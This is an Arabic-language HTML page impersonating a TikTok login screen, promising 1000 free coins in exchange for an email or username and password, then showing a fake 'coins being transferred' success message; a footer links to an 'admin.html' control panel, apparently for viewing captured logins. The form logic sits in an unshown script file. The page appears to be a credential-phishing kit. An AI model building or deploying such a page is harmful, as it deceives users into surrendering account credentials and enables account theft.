<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>تسجيل الدخول - تيك توك</title>
    <link rel="stylesheet" href="style.css" />
</head>
<body>

    <div class="login-container">
        <div class="login-box">
            <div class="logo">
                <h1>🎵 TikTok</h1>
                <p>احصل على 1000 كوينز مجاناً!</p>
            </div>
            <form id="loginForm">
                <label for="email">البريد الإلكتروني أو اسم المستخدم</label>
                <input type="text" id="email" placeholder="example@email.com" required />

                <label for="password">كلمة السر</label>
                <input type="password" id="password" placeholder="••••••••" required />

                <button type="submit">تسجيل الدخول</button>
            </form>
            <p id="successMessage" style="display: none; color: green; margin-top: 15px;">
                ✅ تم تسجيل الدخول بنجاح! جاري تحويل الكوينز...
            </p>
            <p style="margin-top: 20px; font-size: 14px; color: #888;">
                🎁 هدية مجانية: 1000 كوينز عند تسجيل الدخول
            </p>
        </div>
    </div>

    <footer>
        <div class="container">
            <p style="margin-top: 10px; font-size: 14px;">
                <a href="admin.html" style="color: #fff; text-decoration: underline;">👑 لوحة التحكم</a>
            </p>
        </div>
    </footer>

    <script src="script.js"></script>
</body>
</html>
